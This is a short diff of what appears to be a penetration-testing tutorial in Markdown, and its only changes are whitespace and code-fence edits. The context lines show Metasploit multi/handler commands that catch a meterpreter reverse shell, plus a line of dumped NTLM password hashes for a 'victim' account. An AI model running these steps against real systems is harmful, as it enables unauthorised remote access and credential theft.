@@ -416,7 +416,7 @@ msf5 exploit(multi/handler) > set LHOST <Local IP>
 msf5 exploit(multi/handler) > set LPORT <Local Port>
 msf5 exploit(multi/handler) > Run
 
-  ```
+```
   
 Boom you will get meterpreter shell easily
 
@@ -448,6 +448,7 @@ victim:1003:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::
 meterpreter >
 
 ```
+
 
 
 
